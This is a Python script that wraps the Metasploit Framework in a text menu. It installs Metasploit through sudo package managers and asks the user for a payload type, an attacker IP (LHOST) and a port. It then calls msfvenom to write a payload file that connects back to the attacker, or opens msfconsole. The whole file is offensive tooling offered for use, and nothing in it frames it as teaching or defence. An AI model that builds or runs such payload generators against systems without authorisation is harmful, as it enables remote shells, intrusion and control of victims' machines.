import subprocess
import platform
import os
import shutil
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

def install_dependencies():
    print(Fore.YELLOW + "Checking for required dependencies...")
    try:
        subprocess.run(['msfvenom', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['msfconsole', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(Fore.GREEN + "Dependencies already installed.")
        return True
    except FileNotFoundError:
        print(Fore.RED + "Required dependencies not found.")
        install_option = input(Fore.YELLOW + "Do you want to install Metasploit Framework? (Y/N): ").strip().lower()
        if install_option == 'y':
            return install_metasploit()
        else:
            print(Fore.YELLOW + "Please install Metasploit Framework manually and make sure it's in your PATH.")
            return False

def install_metasploit():
    print(Fore.YELLOW + "Installing Metasploit Framework...")
    try:
        print(Fore.YELLOW + "Installing Metasploit Framework on Linux...")
        if shutil.which('apt-get'):
            subprocess.run(['sudo', 'apt-get', 'install', '-y', 'metasploit-framework'])
        elif shutil.which('yum'):
            subprocess.run(['sudo', 'yum', 'install', '-y', 'metasploit-framework'])
        elif shutil.which('zypper'):
            subprocess.run(['sudo', 'zypper', 'install', '-y', 'metasploit-framework'])
        elif shutil.which('pacman'):
            subprocess.run(['sudo', 'pacman', '-S', '--noconfirm', 'metasploit'])
        else:
            print(Fore.RED + "Unsupported package manager. Please install Metasploit Framework manually.")
            return False
        print(Fore.GREEN + "Metasploit Framework installed successfully.")
        return True
    except Exception as e:
        print(Fore.RED + f"Error installing Metasploit Framework: {e}")
        return False

def create_payload():
    print(Fore.YELLOW + "Enter the payload type or type 'help' for available payloads:")
    while True:
        payload_type = input("Payload Type: ").strip().lower()
        if payload_type == 'help':
            show_payloads()
        else:
            lhost = input("Enter LHOST (Attacker's IP address): ")
            lport = input("Enter LPORT: ")
            generate_payload(payload_type, lhost, lport)
            break

def generate_payload(payload_type, lhost, lport):
    payload_file = input("Enter output filename (without extension): ")
    try:
        subprocess.run(['msfvenom', '-p', payload_type, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'raw', '-o', f'{payload_file}'])
        print(Fore.GREEN + f"Payload generated successfully as {payload_file}")
    except Exception as e:
        print(Fore.RED + "Error:", e)

def show_payloads():
    try:
        subprocess.run(['msfconsole', '-q', '-x', 'show payloads'])
    except FileNotFoundError:
        print(Fore.RED + "msfconsole not found. Make sure Metasploit Framework is installed and in your PATH.")

def launch_msfconsole():
    try:
        print()
        subprocess.Popen(['msfconsole'])
    except FileNotFoundError:
        print(Fore.RED + "msfconsole not found. Make sure Metasploit Framework is installed and in your PATH.")

if __name__ == "__main__":
    if not install_dependencies():
        exit()

    while True:
        print("\n" + Fore.MAGENTA + "Metasploit Payload Creator")
        print(Fore.CYAN + "1. Create Payload")
        print("2. Launch msfconsole")
        print("3. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            create_payload()
        elif choice == '2':
            launch_msfconsole()
        elif choice == '3':
            print(Fore.RED + "Exiting...")
            break
        else:
            print(Fore.RED + "Invalid choice. Please try again.")
